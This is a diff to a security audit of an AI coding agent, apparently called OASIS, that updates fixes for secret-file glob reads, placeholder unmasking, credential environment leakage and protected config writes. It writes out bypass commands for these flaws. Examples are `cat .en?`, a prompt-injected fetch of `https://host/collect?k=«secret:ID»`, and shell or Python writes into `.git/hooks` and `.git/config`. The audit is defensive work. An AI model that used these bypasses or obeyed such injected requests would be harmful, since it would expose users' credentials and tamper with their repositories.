@@ -297,7 +297,7 @@ Each item below was reproduced with an attack test before the fix; the same test
 
 **Finding:** the no-prompt read-only path checked each argument against the secret-file list, but the shell expands globs after that check, so `cat .en?`, `head .[e]nv` or `wc -c .e*` read `.env` with no prompt. Recursive searches (`grep -r KEY .`, `rg --hidden`, `rg -uu`, `diff -r`, `git grep --untracked`/`--no-index`) read every file in the folder, and `git show HEAD:.env` read a committed secret.
 
-**Fix:** unquoted glob characters make a line ask. A recursive search runs without asking only when a bounded walk (5,000 entries; `node_modules` and `.git` skipped) of its folders finds no secret file and, for symlink-following forms (`grep -R`, `rg -L`, `diff -r`), no symlink. `rg`/`ag` without hidden-file flags ignore hidden secrets, as those tools do. `.ssh`, `.aws`, `.gnupg`, `.azure`, `.kube` and `.docker` folders count as secret. Quoted patterns (`grep -rn 'a.*b' src`) still run without asking. **Test:** `test/read-only-commands.test.mjs` (glob/recursive cases plus an end-to-end `run_shell cat .en?` approval check).
+**Fix:** OASIS expands unquoted globs itself the way bash does (no dotglob, bounded 5,000-entry walk, no expansion through symlinked folders that leave the workspace). The line runs without asking only when no match is a secret or sensitive file and nothing escapes the workspace; a glob in the command word or a `cd` argument, an absolute or invalid glob, or a walk over the limit asks. So `ls src/*.js` and `wc -l test/*.mjs` run, and `cat .en?` asks. A recursive search runs without asking only when a bounded walk (5,000 entries; `node_modules` and `.git` skipped) of its folders finds no secret file and, for symlink-following forms (`grep -R`, `rg -L`, `diff -r`), no symlink. `rg`/`ag` without hidden-file flags ignore hidden secrets, as those tools do. `.ssh`, `.aws`, `.gnupg`, `.azure`, `.kube` and `.docker` folders count as secret. Quoted patterns (`grep -rn 'a.*b' src`) still run without asking. **Test:** `test/read-only-commands.test.mjs` (attack globs, benign globs that run, recursive cases, plus an end-to-end `run_shell cat .en?` approval check).
 
 ### Read-only git ran repository-defined programs (medium)
 
@@ -323,13 +323,13 @@ Each item below was reproduced with an attack test before the fix; the same test
 
 **Finding:** the secret shield swapped `«secret:ID»` placeholders back to the real value in every tool's arguments before authorization. `fetch_url` asks once per host, so a prompt-injected page on a host the user already approved could have the agent fetch `https://host/collect?k=«secret:ID»` and receive the credential with no further prompt; `web_search` queries were unmasked the same way.
 
-**Fix:** `fetch_url`, `web_search` and `browser` keep the placeholder text; file edits and commands still receive the real value. **Test:** `test/secret-shield.test.mjs` (end-to-end with a `PreToolUse` hook recording the final input). **Remaining:** commands and MCP tools still receive real values by design (that is how the agent edits `.env` or passes a token); a `task` prompt containing a placeholder gives the subagent the real value, which then reaches the provider.
+**Fix:** `fetch_url`, `web_search` and `browser` keep the placeholder text; file edits and commands still receive the real value. **Test:** `test/secret-shield.test.mjs` (end-to-end with a `PreToolUse` hook recording the final input). **Remaining:** commands and MCP tools still receive real values by design (that is how the agent edits `.env` or passes a token). A `task` prompt containing a placeholder used to give the subagent the real value, which then reached the provider. Now `task`, `send_message`, `team_send_message`, `team_create`, `workflow`, `advisor` and `run_specialist_review` keep placeholders, and a subagent shares its parent's vault, so its own file edits and commands still get the real value (end-to-end test in `test/secret-shield.test.mjs`).
 
 ### Credential coverage gaps in child environments and secret-file names (low)
 
 **Finding:** commands and hooks inherited `DATABASE_URL`, `MYSQL_PWD`, `*_PASSPHRASE`, `NPM_CONFIG__AUTH`, `SENTRY_DSN`, `SLACK_WEBHOOK_URL` and `*_PAT`; eval agents also kept `AWS_ACCESS_KEY_ID` because `src/eval.mjs` had its own copy of the pattern without `ACCESS_KEY`. `read_file` and read-only `cat` returned `.envrc`, `.pgpass`, `.my.cnf`, `.htpasswd` and `.dockercfg` with no prompt.
 
-**Fix:** `src/credential-env.mjs` is the one list for commands, hooks and eval agents (`SSH_AUTH_SOCK` is kept so git over SSH works); the five files count as sensitive. **Tests:** `test/credential-env.test.mjs`, `test/read-only-commands.test.mjs`. **Remaining:** stdio MCP servers keep their own (older) list so servers that rely on inherited variables keep working; `service-account.json` and `terraform.tfstate` are not treated as secret files.
+**Fix:** `src/credential-env.mjs` is the one list for commands, hooks and eval agents (`SSH_AUTH_SOCK` is kept so git over SSH works); the five files count as sensitive. **Tests:** `test/credential-env.test.mjs`, `test/read-only-commands.test.mjs`. Stdio MCP servers now use the same list (`safeEnvironment` in `src/mcp.mjs`); a server that needs a credential names it in `passEnv` or `env`. **Remaining:** `service-account.json` and `terraform.tfstate` are not treated as secret files.
 
 ### Areas tested that held up
 
@@ -367,3 +367,9 @@ Free-form shell strings are a different risk class from argv-based commands. The
 3. Validate the sandbox configuration and workspace trust boundary before launch.
 4. Test denied network access, secrets, PTY/background commands, cancellation, startup failure, cleanup, and process descendants.
 5. Make unsupported or failed isolation visible; never describe an unsandboxed command as contained.
+
+### Protected config writes through shell spellings (medium)
+
+**Finding:** the shell check for writes into protected config (`.git/hooks`, `.git/config`, `.oasis`, `.mcp.json`, ...) needed a space before the path. `echo x >.git/hooks/pre-commit`, `cd .git/hooks && echo x > pre-commit`, split quotes (`".g"it/hooks/x`), `sponge`, and interpreter writes (`python -c "open('.git/config','w')"`, `Path(...).write_text`) were not recognised as protected writes.
+
+**Fix:** `src/protected-paths.mjs` accepts redirection and separator characters before the path, strips quotes before matching, treats `cd`/`pushd` into a protected folder followed by a write as a protected write, and recognises `sponge`, `open(` and `.write_text`/`.write_bytes`. **Test:** `test/protected-paths.test.mjs`. **Remaining:** globbed protected paths (`.gi?/hooks`), editors such as `ed`/`vim`, and paths built at run time are not caught; the sandbox's read-only binds are the hard guarantee.
